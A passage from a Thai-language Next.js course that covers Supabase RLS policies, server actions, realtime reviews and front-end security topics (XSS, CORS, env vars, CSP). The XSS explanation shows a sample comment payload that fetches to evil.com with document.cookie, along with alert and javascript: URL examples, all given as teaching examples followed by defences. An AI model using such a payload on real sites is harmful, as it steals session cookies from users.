ทำไม RLS สำคัญมาก?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ถ้าไม่มี RLS:
  สมมติ Bug ใน Code ทำให้ userId ผิด
  → User A อาจเห็นข้อมูลของ User B ได้!

ถ้ามี RLS:
  แม้ Code มี Bug → Database จะปฏิเสธการเข้าถึงทันที
  เพราะ Policy กำหนดว่า User เห็นได้แค่แถวที่ user_id = ตัวเอง

RLS = Seatbelt ของ Database
```

**เปิดใช้ RLS และสร้าง Policy:**

```sql
-- ─── 1. เปิด RLS ─────────────────────────────────────────────
ALTER TABLE favorites ENABLE ROW LEVEL SECURITY;
ALTER TABLE reviews ENABLE ROW LEVEL SECURITY;
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

-- ─── 2. Policy สำหรับ favorites ─────────────────────────────

-- อ่านได้เฉพาะ Favorites ของตัวเอง
CREATE POLICY "Users can read own favorites"
  ON favorites FOR SELECT
  USING (auth.uid() = user_id);
--         ↑
-- auth.uid() คือ Function ของ Supabase ที่ return userId ของผู้ใช้ปัจจุบัน

-- เพิ่มได้เฉพาะในชื่อของตัวเอง
CREATE POLICY "Users can insert own favorites"
  ON favorites FOR INSERT
  WITH CHECK (auth.uid() = user_id);

-- ลบได้เฉพาะของตัวเอง
CREATE POLICY "Users can delete own favorites"
  ON favorites FOR DELETE
  USING (auth.uid() = user_id);

-- ─── 3. Policy สำหรับ reviews ────────────────────────────────

-- ทุกคนอ่าน Review ได้ (Review เป็นข้อมูล Public)
CREATE POLICY "Reviews are publicly readable"
  ON reviews FOR SELECT
  USING (true);  -- ← true = ทุกคนอ่านได้

-- เพิ่ม Review ได้เฉพาะในชื่อตัวเอง
CREATE POLICY "Users can insert own reviews"
  ON reviews FOR INSERT
  WITH CHECK (auth.uid() = user_id);

-- แก้ได้เฉพาะของตัวเอง
CREATE POLICY "Users can update own reviews"
  ON reviews FOR UPDATE
  USING (auth.uid() = user_id);

-- ลบได้เฉพาะของตัวเอง
CREATE POLICY "Users can delete own reviews"
  ON reviews FOR DELETE
  USING (auth.uid() = user_id);

-- ─── 4. Policy สำหรับ profiles ──────────────────────────────

-- อ่าน Profile ได้ทุกคน (ข้อมูล Public)
CREATE POLICY "Profiles are publicly readable"
  ON profiles FOR SELECT
  USING (true);

-- แก้ไขได้เฉพาะ Profile ตัวเอง
CREATE POLICY "Users can update own profile"
  ON profiles FOR UPDATE
  USING (auth.uid() = id);
```

**ทดสอบ RLS ใน SQL Editor:**

```sql
-- ทดสอบโดยแกล้งทำเป็นว่าเป็น User อื่น
SET LOCAL role = authenticated;
SET LOCAL request.jwt.claims = '{"sub": "user-uuid-ที่ไม่ใช่เจ้าของ"}';

-- ถ้า RLS ทำงานถูกต้อง → ไม่ควรเห็น Favorites ของ User อื่น
SELECT * FROM favorites WHERE user_id = 'uuid-ของ-user-อื่น';
-- Result: 0 rows ← ถูกต้อง!
```

---

### ใช้งาน Supabase ใน Next.js — ตัวอย่างจริงครบวงจร

**หน้า Favorites — Server Component:**

```typescript
// app/favorites/page.tsx
import { auth } from '@/auth'
import { redirect } from 'next/navigation'
import { getFavorites } from '@/lib/supabase/queries/favorites'
import { FavoritesList } from '@/components/FavoritesList'

export default async function FavoritesPage() {
  const session = await auth()
  if (!session) redirect('/login')

  // ดึงข้อมูลบน Server — เร็วและ SEO ดี
  const favorites = await getFavorites(session.user.id)

  return (
    <div className="container mx-auto px-4 py-8">
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-2xl font-bold">รายการโปรดของฉัน</h1>
        <span className="text-gray-500 text-sm">{favorites.length} เรื่อง</span>
      </div>

      {favorites.length === 0 ? (
        <EmptyFavorites />
      ) : (
        <FavoritesList initialFavorites={favorites} />
      )}
    </div>
  )
}
```

**Server Action สำหรับ Toggle Favorite:**

```typescript
// app/favorites/actions.ts
'use server'

import { auth } from '@/auth'
import { createClient } from '@/lib/supabase/server'
import { revalidatePath } from 'next/cache'

export async function toggleFavorite(formData: FormData) {
  const session = await auth()
  if (!session) throw new Error('กรุณา Login ก่อน')

  const movieId = Number(formData.get('movieId'))
  const movieTitle = formData.get('movieTitle') as string
  const posterPath = formData.get('posterPath') as string
  const action = formData.get('action') as 'add' | 'remove'

  const supabase = await createClient()

  if (action === 'add') {
    const { error } = await supabase.from('favorites').insert({
      user_id: session.user.id,
      movie_id: movieId,
      movie_title: movieTitle,
      poster_path: posterPath,
    })
    if (error && error.code !== '23505') { // 23505 = already exists
      throw new Error('ไม่สามารถเพิ่มรายการโปรดได้')
    }
  } else {
    const { error } = await supabase
      .from('favorites')
      .delete()
      .eq('user_id', session.user.id)
      .eq('movie_id', movieId)
    if (error) throw new Error('ไม่สามารถลบรายการโปรดได้')
  }

  revalidatePath('/favorites')
  revalidatePath(`/movies/${movieId}`)
}
```

**FavoriteButton — Client Component:**

```typescript
// components/FavoriteButton.tsx
'use client'

import { useState, useTransition } from 'react'
import { toggleFavorite } from '@/app/favorites/actions'
import { HeartIcon } from 'lucide-react'
import { toast } from 'sonner'

interface FavoriteButtonProps {
  movieId: number
  movieTitle: string
  posterPath: string
  initialIsFavorite: boolean
}

export function FavoriteButton({
  movieId,
  movieTitle,
  posterPath,
  initialIsFavorite,
}: FavoriteButtonProps) {
  const [isFavorite, setIsFavorite] = useState(initialIsFavorite)
  const [isPending, startTransition] = useTransition()

  const handleToggle = () => {
    // Optimistic Update
    setIsFavorite(prev => !prev)

    startTransition(async () => {
      const formData = new FormData()
      formData.set('movieId', String(movieId))
      formData.set('movieTitle', movieTitle)
      formData.set('posterPath', posterPath)
      formData.set('action', isFavorite ? 'remove' : 'add')

      try {
        await toggleFavorite(formData)
        toast.success(isFavorite ? 'ลบออกจากรายการโปรดแล้ว' : 'เพิ่มในรายการโปรดแล้ว')
      } catch (error) {
        // Rollback ถ้าล้มเหลว
        setIsFavorite(prev => !prev)
        toast.error('เกิดข้อผิดพลาด กรุณาลองใหม่')
      }
    })
  }

  return (
    <button
      onClick={handleToggle}
      disabled={isPending}
      aria-label={isFavorite ? 'ลบออกจากรายการโปรด' : 'เพิ่มในรายการโปรด'}
      className={`p-2 rounded-full transition-all ${
        isFavorite
          ? 'bg-red-100 text-red-500 hover:bg-red-200'
          : 'bg-gray-100 text-gray-400 hover:bg-gray-200 hover:text-gray-600'
      } disabled:opacity-50`}
    >
      <HeartIcon
        className="w-5 h-5"
        fill={isFavorite ? 'currentColor' : 'none'}
      />
    </button>
  )
}
```

---

### Realtime Subscriptions — ข้อมูล Live

Supabase Realtime ใช้ **PostgreSQL Logical Replication** และ **WebSocket** เพื่อส่งการเปลี่ยนแปลงของ Database ไปยัง Client แบบทันที:

```
Realtime ทำงานอย่างไร:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

User A เพิ่ม Review
       ↓
Supabase Database อัปเดต
       ↓
Supabase Realtime Server สังเกตเห็นการเปลี่ยนแปลง
       ↓
ส่งผ่าน WebSocket ไปยังทุก Client ที่ Subscribe อยู่
       ↓
User B, C, D เห็นรีวิวใหม่โดยไม่ต้อง Refresh
```

**ตัวอย่าง: แสดง Review แบบ Realtime:**

```typescript
// components/RealtimeReviews.tsx
'use client'

import { useEffect, useState } from 'react'
import { createClient } from '@/lib/supabase/client'

interface Review {
  id: number
  user_id: string
  movie_id: number
  rating: number
  comment: string
  created_at: string
}

export function RealtimeReviews({
  movieId,
  initialReviews,
}: {
  movieId: number
  initialReviews: Review[]
}) {
  const [reviews, setReviews] = useState<Review[]>(initialReviews)
  const supabase = createClient()

  useEffect(() => {
    // สร้าง Realtime Channel
    const channel = supabase
      .channel(`reviews-movie-${movieId}`)  // ← ชื่อ Channel ต้อง Unique

      // ─── Subscribe การเพิ่มข้อมูลใหม่ ────────────────────
      .on(
        'postgres_changes',
        {
          event: 'INSERT',           // สนใจแค่ INSERT
          schema: 'public',
          table: 'reviews',
          filter: `movie_id=eq.${movieId}`, // เฉพาะหนังเรื่องนี้
        },
        (payload) => {
          const newReview = payload.new as Review
          // เพิ่ม Review ใหม่ไว้ด้านบน
          setReviews(prev => [newReview, ...prev])
        }
      )

      // ─── Subscribe การลบ ──────────────────────────────────
      .on(
        'postgres_changes',
        {
          event: 'DELETE',
          schema: 'public',
          table: 'reviews',
          filter: `movie_id=eq.${movieId}`,
        },
        (payload) => {
          const deletedId = payload.old.id
          setReviews(prev => prev.filter(r => r.id !== deletedId))
        }
      )

      // ─── Subscribe การแก้ไข ───────────────────────────────
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'reviews',
          filter: `movie_id=eq.${movieId}`,
        },
        (payload) => {
          const updatedReview = payload.new as Review
          setReviews(prev =>
            prev.map(r => r.id === updatedReview.id ? updatedReview : r)
          )
        }
      )

      .subscribe()

    // Cleanup: ยกเลิก Subscription เมื่อ Component Unmount
    return () => {
      supabase.removeChannel(channel)
    }
  }, [movieId])

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-2">
        <h3 className="font-semibold">รีวิวทั้งหมด ({reviews.length})</h3>
        {/* แสดงจุดเขียวเพื่อบอกว่าเชื่อมต่อ Realtime */}
        <span className="flex items-center gap-1 text-xs text-green-600">
          <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
          Live
        </span>
      </div>

      {reviews.map(review => (
        <ReviewCard key={review.id} review={review} />
      ))}
    </div>
  )
}
```

**ใช้งานใน Server Component:**

```typescript
// app/movies/[id]/page.tsx
import { createClient } from '@/lib/supabase/server'
import { RealtimeReviews } from '@/components/RealtimeReviews'

export default async function MoviePage({ params }: { params: { id: string } }) {
  const movieId = Number(params.id)
  const supabase = await createClient()

  // ดึง Reviews เริ่มต้นบน Server (SEO ดี, เร็ว)
  const { data: initialReviews } = await supabase
    .from('reviews')
    .select('*')
    .eq('movie_id', movieId)
    .order('created_at', { ascending: false })

  return (
    <div>
      {/* ... ข้อมูลหนัง ... */}

      {/* ส่ง initialReviews ไปให้ Client Component ทำ Realtime ต่อ */}
      <RealtimeReviews
        movieId={movieId}
        initialReviews={initialReviews ?? []}
      />
    </div>
  )
}
```

---

### Supabase Storage — จัดการไฟล์และรูปภาพ

```typescript
// lib/supabase/storage.ts
// ← อัปโหลดรูป Avatar ของผู้ใช้

import { createClient } from '@/lib/supabase/client'

export async function uploadAvatar(userId: string, file: File) {
  const supabase = createClient()

  // ตั้งชื่อไฟล์ให้ Unique ด้วย timestamp
  const fileExt = file.name.split('.').pop()
  const fileName = `${userId}-${Date.now()}.${fileExt}`
  const filePath = `avatars/${fileName}`

  // อัปโหลดไฟล์
  const { error: uploadError } = await supabase.storage
    .from('user-uploads')   // ← ชื่อ Bucket
    .upload(filePath, file, {
      cacheControl: '3600',  // Cache 1 ชั่วโมง
      upsert: true,          // ถ้ามีอยู่แล้ว ให้ Overwrite
    })

  if (uploadError) throw uploadError

  // ดึง Public URL ของไฟล์ที่อัปโหลด
  const { data } = supabase.storage
    .from('user-uploads')
    .getPublicUrl(filePath)

  return data.publicUrl
}
```

---

## 5.5 Web Security สำหรับ Front-End Developer

### ทำไม Front-End Developer ต้องรู้เรื่อง Security?

```
ความเข้าใจผิดที่พบบ่อย:
"Security เป็นเรื่องของ Back-end" ← ผิด!

Front-End Developer คือด่านแรกที่รับข้อมูลจากผู้ใช้
และเป็นคนที่ render HTML ลงใน Browser

ถ้า Front-End Developer เขียนโค้ดไม่ปลอดภัย:
→ ข้อมูลผู้ใช้ถูกขโมย
→ ผู้ใช้ถูก redirect ไปเว็บอันตราย
→ Session ถูก Hijack
→ บริษัทเสียชื่อเสียงและเงิน
```

---

### XSS — Cross-Site Scripting

**XSS** คือการที่ Attacker ฝัง JavaScript อันตรายลงในหน้าเว็บของเรา แล้ว JavaScript นั้นรันในเครื่องของ Victim:

```
ตัวอย่าง XSS แบบง่าย:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

เว็บรีวิวหนัง มีช่องให้ใส่ความคิดเห็น
Attacker พิมพ์ว่า:
  <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

ถ้าเว็บ render ข้อความนี้โดยไม่กรองก่อน:
→ ทุกคนที่เห็นรีวิวนี้ จะรัน Script ที่ขโมย Cookie
→ Attacker ได้ Session Token ของ Victim
→ Login เป็น Victim ได้เลย
```

**ใน React — ปลอดภัยโดย Default:**

```typescript
// ✅ React หนีอักขระ HTML ให้อัตโนมัติ
// ไม่มีทาง XSS ผ่าน JSX ปกติ
const userComment = '<script>alert("xss")</script>'

return <p>{userComment}</p>
// Render เป็น: <p>&lt;script&gt;alert("xss")&lt;/script&gt;</p>
// ← ปลอดภัย แสดงเป็นข้อความธรรมดา ไม่รัน

// ❌ อันตราย! dangerouslySetInnerHTML หลีก Escaping ทั้งหมด
// ใช้เฉพาะเมื่อจำเป็น และมั่นใจว่า Input สะอาด 100%
return <p dangerouslySetInnerHTML={{ __html: userComment }} />
// ← XSS ผ่านได้เลย!
```

**กรณีที่ต้องใช้ HTML จาก User — ต้องผ่าน Sanitize ก่อน:**

```typescript
// ติดตั้ง DOMPurify สำหรับ Sanitize HTML
// pnpm add dompurify
// pnpm add -D @types/dompurify

import DOMPurify from 'dompurify'

function RichTextDisplay({ htmlContent }: { htmlContent: string }) {
  // Sanitize ก่อนเสมอ — ลบ Script และ Attribute อันตรายออก
  const cleanHtml = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
  })

  return (
    <div
      dangerouslySetInnerHTML={{ __html: cleanHtml }}
      className="prose"
    />
  )
}
```

**XSS ผ่าน URL — อีกช่องที่มักลืม:**

```typescript
// ❌ อันตราย!
// ถ้า url = "javascript:alert('xss')"
function LinkComponent({ url }: { url: string }) {
  return <a href={url}>คลิกที่นี่</a>
}

// ✅ ตรวจสอบ URL ก่อนเสมอ
function SafeLink({ url }: { url: string }) {
  // อนุญาตเฉพาะ http และ https
  const isValidUrl = url.startsWith('https://') || url.startsWith('http://')

  if (!isValidUrl) {
    return <span className="text-gray-400">ลิงก์ไม่ถูกต้อง</span>
  }

  return (
    <a
      href={url}
      target="_blank"
      rel="noopener noreferrer"  // ← ป้องกัน Tab Hijacking
    >
      คลิกที่นี่
    </a>
  )
}
```

---

### CORS — Cross-Origin Resource Sharing

**CORS** คือกลไกของ Browser ที่ป้องกัน JavaScript จาก Origin หนึ่งไม่ให้เรียก API ของอีก Origin หนึ่ง โดยไม่ได้รับอนุญาต:

```
Origin = Protocol + Domain + Port

https://myapp.com:443  ≠  http://myapp.com:80
https://myapp.com      ≠  https://api.myapp.com
https://myapp.com      ≠  https://otherapp.com

CORS Error เกิดเมื่อ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
JavaScript ที่ https://myapp.com เรียก fetch('https://api.other.com/data')
→ Browser ส่ง Request ไปพร้อม Header: Origin: https://myapp.com
→ Server ต้องตอบกลับด้วย: Access-Control-Allow-Origin: https://myapp.com
→ ถ้า Server ไม่ตอบ → Browser บล็อก Response → CORS Error
```

**CORS Error ที่เห็นใน Console:**

```
Access to fetch at 'https://api.example.com/data' from origin
'http://localhost:3000' has been blocked by CORS policy:
No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

**วิธีแก้ CORS — Next.js API Route เป็น Proxy:**

```typescript
// app/api/movies/route.ts
// ← สร้าง Proxy ใน Next.js เพื่อให้ Server คุยกับ External API แทน Browser

import { NextResponse } from 'next/server'

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const page = searchParams.get('page') || '1'

  // Server ไม่มีปัญหา CORS เพราะ CORS เป็นกฎของ Browser
  const response = await fetch(
    `https://api.themoviedb.org/3/movie/popular?api_key=${process.env.TMDB_API_KEY}&page=${page}`,
  )

  const data = await response.json()
  return NextResponse.json(data)
}
```

```typescript
// ใน Client Component
// เรียก API ของเราเอง (Next.js) ไม่ใช่ TMDB โดยตรง
const { data } = useQuery({
  queryKey: ['movies', 'popular', page],
  queryFn: () =>
    fetch(`/api/movies?page=${page}`).then(r => r.json()),
})
```

**ข้อดีของ Proxy Pattern:**
- ไม่มีปัญหา CORS เพราะ Client คุยกับ Server เดียวกัน
- ซ่อน API Key ไว้ใน Server (ไม่รั่วไป Browser)
- เพิ่ม Logic เช่น Rate Limiting, Caching ได้

---

### Environment Variables — จัดการ Secret ให้ถูกต้อง

```
กฎสำคัญ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ข้อมูล Secret ต้องอยู่ใน .env เท่านั้น
ห้ามเขียนลงใน Source Code เด็ดขาด!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**ใน Next.js มี 2 ประเภท:**

```bash
# .env.local

# ─── Server-only (ปลอดภัย) ────────────────────────────────
# ไม่มี NEXT_PUBLIC_ prefix
# ใช้ได้เฉพาะใน Server Component, Server Action, API Route
DATABASE_URL="postgresql://..."
TMDB_API_KEY="abc123secret"          # ← ไม่รั่วไป Browser
AUTH_SECRET="super-secret-value"
SUPABASE_SERVICE_ROLE_KEY="eyJ..."   # ← ห้ามมี NEXT_PUBLIC_ เด็ดขาด

# ─── Client-safe (ส่งไป Browser ได้) ──────────────────────
# ต้องมี NEXT_PUBLIC_ prefix — คิดว่าทุกคนอ่านได้
NEXT_PUBLIC_SUPABASE_URL="https://xxx.supabase.co"
NEXT_PUBLIC_SUPABASE_ANON_KEY="eyJ..."  # anon key ออกแบบมาให้ Public
NEXT_PUBLIC_APP_URL="https://myapp.com"
```

**ตัวอย่างที่ผิดบ่อย:**

```typescript
// ❌ ผิดมาก! API Key รั่วไป Browser ทั้งโลกเห็น
// เพราะ NEXT_PUBLIC_ ส่ง Key นี้ไปใน JavaScript Bundle
const NEXT_PUBLIC_TMDB_API_KEY = process.env.NEXT_PUBLIC_TMDB_API_KEY

// ❌ Hardcode ใน Source Code — โดน Commit ลง Git → ทุกคนเห็น
const API_KEY = 'abc123verysecretkey'
```

```typescript
// ✅ ถูกต้อง — ใช้ใน Server Component หรือ API Route เท่านั้น
const apiKey = process.env.TMDB_API_KEY  // ← ไม่มี NEXT_PUBLIC_

// ✅ ตรวจสอบว่ามีค่าก่อนใช้ (fail fast)
if (!process.env.TMDB_API_KEY) {
  throw new Error('TMDB_API_KEY is not set in environment variables')
}
```

**ไฟล์ `.env.example` — บอกทีมว่าต้องตั้งค่าอะไร:**

```bash
# .env.example  ← Commit ไฟล์นี้ขึ้น Git ได้ (ไม่มีค่าจริง)
# ไฟล์นี้เป็น Template บอกนักพัฒนาคนใหม่ว่าต้องตั้งค่าอะไรบ้าง

AUTH_SECRET=""
GOOGLE_CLIENT_ID=""
GOOGLE_CLIENT_SECRET=""
NEXT_PUBLIC_SUPABASE_URL=""
NEXT_PUBLIC_SUPABASE_ANON_KEY=""
SUPABASE_SERVICE_ROLE_KEY=""
TMDB_API_KEY=""
NEXT_PUBLIC_APP_URL="http://localhost:3000"
```

```bash
# .gitignore  ← ห้าม Commit ไฟล์ที่มีค่าจริง!
.env
.env.local
.env.*.local
```

---

### Content Security Policy (CSP) เบื้องต้น

**CSP** คือ HTTP Header ที่บอก Browser ว่าอนุญาตให้โหลดทรัพยากรจากที่ไหนได้บ้าง เป็นชั้นป้องกัน XSS ชั้นสุดท้าย:

```typescript
// next.config.ts
import type { NextConfig } from 'next'

const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' blob: data: https://image.tmdb.org https://*.supabase.co;
  font-src 'self';
  connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.themoviedb.org;
  frame-ancestors 'none';
`

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: ContentSecurityPolicy.replace(/\n/g, ' ').trim(),
          },
          // ป้องกัน Clickjacking
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          // ป้องกัน MIME Type Sniffing
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          // บังคับใช้ HTTPS
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=63072000; includeSubDomains; preload',
          },
        ],
      },
    ]
  },
}

export default nextConfig
```

**อ่าน CSP Header:**

```
Content-Security-Policy: default-src 'self'; img-src 'self' https://image.tmdb.org

default-src 'self'
→ โดย Default โหลดทรัพยากรจากหน้าเว็บตัวเองเท่านั้น

img-src 'self' https://image.tmdb.org
→ รูปภาพ: โหลดจากตัวเองได้ และจาก TMDB เท่านั้น
→ ถ้า Attacker ฝัง <img src="https://evil.com/track.gif">
→ Browser บล็อก เพราะ evil.com ไม่อยู่ใน Whitelist
```

---

### Security Checklist สำหรับ Front-End Developer

```
ก่อน Deploy ทุกครั้ง ตรวจสอบ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Authentication & Authorization
  □ Protected Routes ทุกหน้าที่ต้อง Login มี Middleware ป้องกัน
  □ Server Action ทุกตัวตรวจสอบ Session ก่อนทำงาน
  □ Role-based Access Control (Admin vs User) ทำงานถูกต้อง

Data Validation
  □ Validate Input ทั้งฝั่ง Client (UX) และ Server (Security)
  □ ไม่ Trust ข้อมูลที่มาจาก URL Parameter โดยไม่ตรวจสอบ
  □ ตรวจสอบ Type และ Range ก่อนส่งไป Database

XSS Prevention
  □ ไม่ใช้ dangerouslySetInnerHTML โดยไม่ Sanitize
  □ ตรวจสอบ URL ก่อนใช้ใน href
  □ ทุก Link ที่เปิด Tab ใหม่มี rel="noopener noreferrer"

Environment Variables
  □ ไม่มี Secret ใน NEXT_PUBLIC_ Variables
  □ .env.local อยู่ใน .gitignore
  □ .env.example มีครบและ Commit ขึ้น Git แล้ว
  □ Production ตั้งค่า Env Vars ใน Vercel Dashboard

Supabase
  □ RLS เปิดใช้งานทุก Table
  □ Policy ทดสอบแล้วว่า User ไม่เห็นข้อมูลคนอื่น
  □ service_role key ไม่ถูกส่งไป Client เด็ดขาด

Dependencies
  □ รัน pnpm audit เพื่อตรวจช่องโหว่ใน Package ที่ใช้
  □ อัปเดต Package สำคัญสม่ำเสมอ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## โปรเจกต์ปฏิบัติ หน่วยที่ 5 — Movie Finder ฉบับสมบูรณ์

ต่อยอดโปรเจกต์ Movie Finder จาก Unit 4 ให้สมบูรณ์โดยผสานทุกอย่างที่เรียนใน Unit 5:

### โครงสร้างโปรเจกต์

```
movie-finder/
├── app/
│   ├── (auth)/
│   │   └── login/
│   │       └── page.tsx          ← หน้า Login ด้วย Google
│   ├── (protected)/
│   │   ├── layout.tsx            ← ตรวจ Auth สำหรับ Group
│   │   ├── dashboard/
│   │   │   └── page.tsx          ← หน้า Dashboard (ต้อง Login)
│   │   ├── favorites/
│   │   │   ├── page.tsx          ← รายการโปรด
│   │   │   └── actions.ts        ← Server Actions
│   │   └── profile/
│   │       └── page.tsx          ← โปรไฟล์ผู้ใช้
│   ├── movies/
│   │   ├── page.tsx              ← รายการหนัง (Public)
│   │   └── [id]/
│   │       └── page.tsx          ← รายละเอียดหนัง (Public)
│   ├── api/
│   │   ├── auth/
│   │   │   └── [...nextauth]/
│   │   │       └── route.ts      ← Auth.js Handler
│   │   └── movies/
│   │       └── route.ts          ← TMDB Proxy
│   ├── layout.tsx
│   └── providers.tsx
├── auth.ts                       ← Auth.js Config
├── middleware.ts                 ← Protected Routes
├── lib/
│   ├── api.ts                    ← TMDB API Client
│   └── supabase/
│       ├── client.ts
│       ├── server.ts
│       ├── queries/
│       │   ├── favorites.ts
│       │   └── reviews.ts
│       └── actions/
│           └── favorites.ts
├── hooks/
│   ├── useMovies.ts              ← TanStack Query Hooks
│   └── useFavorites.ts
└── components/
    ├── MovieCard.tsx
    ├── FavoriteButton.tsx
    ├── RealtimeReviews.tsx
    └── UserMenu.tsx
```

### Requirements ที่ต้องทำ

**Authentication:**
- [ ] Login ด้วย Google ผ่าน Auth.js v5
- [ ] หน้า Login ที่สวยงาม พร้อม Redirect กลับหลัง Login
- [ ] Middleware ป้องกันหน้า `/dashboard`, `/favorites`, `/profile`
- [ ] UserMenu แสดง Avatar, ชื่อ และปุ่ม Logout ใน Navbar

**TanStack Query:**
- [ ] `usePopularMovies` พร้อม Pagination
- [ ] `useSearchMovies` debounce 300ms ก่อน Fetch
- [ ] `useMovieDetail` ดึงรายละเอียดหนัง
- [ ] Skeleton Loading ทุกที่ (ไม่มี Spinner เดี่ยว ๆ)
- [ ] Error State พร้อมปุ่ม Retry

**Supabase:**
- [ ] ตาราง `favorites` และ `reviews` พร้อม RLS ครบ
- [ ] Toggle Favorite (เพิ่ม/ลบ) พร้อม Optimistic Update
- [ ] เขียน Review พร้อม Rating 1-10
- [ ] หน้า `/favorites` แสดงรายการโปรดของผู้ใช้ที่ Login

**Realtime:**
- [ ] Reviews แสดงแบบ Realtime (เห็นรีวิวใหม่โดยไม่ Refresh)
- [ ] แสดงจุดสีเขียว "Live" เพื่อบอกสถานะ Realtime

**Security:**
- [ ] ไม่มี API Key ใน Client-side Code
- [ ] ทุก Server Action ตรวจ Session ก่อน
- [ ] .env.example ครบ
- [ ] RLS ทดสอบแล้วว่าป้องกันการเข้าถึงข้ามผู้ใช้ได้

---

## แบบฝึกหัด Part 2

### แบบฝึกหัดที่ 6: ตั้งค่า Auth.js v5

1. ติดตั้ง `next-auth@beta` และสร้างไฟล์ `auth.ts`
2. สร้าง Google OAuth Credentials ใน Google Cloud Console
3. ตั้งค่า Callback URL: `http://localhost:3000/api/auth/callback/google`
4. สร้างหน้า `/login` ที่มีปุ่ม Login ด้วย Google
5. ทดสอบ Flow: กด Login → Google Auth → กลับมาแอป → เห็นชื่อผู้ใช้
6. เพิ่ม Middleware ป้องกันหน้า `/dashboard`
7. ทดสอบว่าถ้ายังไม่ Login แล้วเข้า `/dashboard` โดยตรง → ถูก Redirect ไป `/login`

---

### แบบฝึกหัดที่ 7: ตั้งค่า Supabase

1. สร้าง Supabase Project ใหม่
2. รัน SQL สร้างตาราง `favorites` และ `reviews` ตาม Schema ที่กำหนด
3. เปิด RLS และสร้าง Policy ทุกตัว
4. ทดสอบ Policy ใน SQL Editor ด้วย `SET LOCAL role = authenticated`
5. ติดตั้ง `@supabase/supabase-js @supabase/ssr` และสร้าง `lib/supabase/client.ts` และ `server.ts`
6. ทดสอบ Connection โดยดึงข้อมูลจาก Table ใน Server Component

---

### แบบฝึกหัดที่ 8: CRUD กับ Supabase

1. สร้าง Server Action `addFavorite(movieId, movieTitle, posterPath)`:
   - ตรวจสอบ Session ก่อน
   - Insert ลง Supabase
   - `revalidatePath('/favorites')`
2. สร้าง Server Action `removeFavorite(movieId)`:
   - ตรวจ Session
   - Delete โดยใช้ user_id + movie_id
3. สร้าง `FavoriteButton` Client Component ที่:
   - รับ `initialIsFavorite` เป็น Prop
   - ทำ Optimistic Update ก่อน
   - เรียก Server Action
   - Rollback ถ้า Error
4. สร้างหน้า `/favorites` ที่แสดงรายการโปรดของผู้ใช้

---

### แบบฝึกหัดที่ 9: Realtime Reviews

1. สร้าง `RealtimeReviews` Component ที่รับ `initialReviews` และ `movieId`
2. ใน `useEffect` สร้าง Supabase Channel Subscribe `INSERT`, `UPDATE`, `DELETE` บน `reviews`
3. อัปเดต State ตาม Event ที่ได้รับ
4. ทดสอบโดยเปิด 2 Browser Tab:
   - Tab A: หน้ารายละเอียดหนัง
   - Tab B: เพิ่มรีวิว
   - Tab A: ต้องเห็นรีวิวใหม่ทันทีโดยไม่ Refresh
5. ทดสอบ DELETE: ลบรีวิวใน Tab B → Tab A ต้องหายไปทันที

---

### แบบฝึกหัดที่ 10: Security Audit

ตรวจสอบโปรเจกต์ของตัวเองกับ Security Checklist:

1. เปิด Browser DevTools → Network Tab → ดูทุก Request ว่ามี API Key รั่วไหม
2. เปิด Source Tab → ค้นหาคำว่า API Key ใน JavaScript Bundle
3. ลองเพิ่ม `<script>alert(1)</script>` ในช่อง Comment → ต้องแสดงเป็นข้อความ ไม่ run
4. ทดสอบว่าถ้า Logout แล้วพยายามเรียก Server Action → ต้องได้ Error
5. ใน Supabase SQL Editor ทดสอบ RLS:
   - Login เป็น User A → เพิ่ม Favorite
   - เปลี่ยนเป็น User B → ต้องไม่เห็น Favorite ของ User A

---

## สรุป หน่วยที่ 5 ทั้งหมด

```
Part 1 — HTTP & TanStack Query
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ HTTP Protocol: Methods, Status Codes, Headers
✅ REST API Design: Resource-based URL, Query Parameters
✅ Bruno: ทดสอบ API ก่อนเขียนโค้ด
✅ TanStack Query: useQuery, useMutation, Optimistic Update
✅ useInfiniteQuery: Infinite Scroll
✅ Custom Hooks: จัดการ Query Logic อย่างเป็นระบบ

Part 2 — Authentication, Supabase & Security
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ JWT: โครงสร้าง, Signature, วิธีเก็บที่ปลอดภัย
✅ OAuth 2.0: Login ด้วย Google ผ่าน Auth.js v5
✅ Session Management: ฝั่ง Server และ Client
✅ Middleware: Protected Routes, Role-based Access
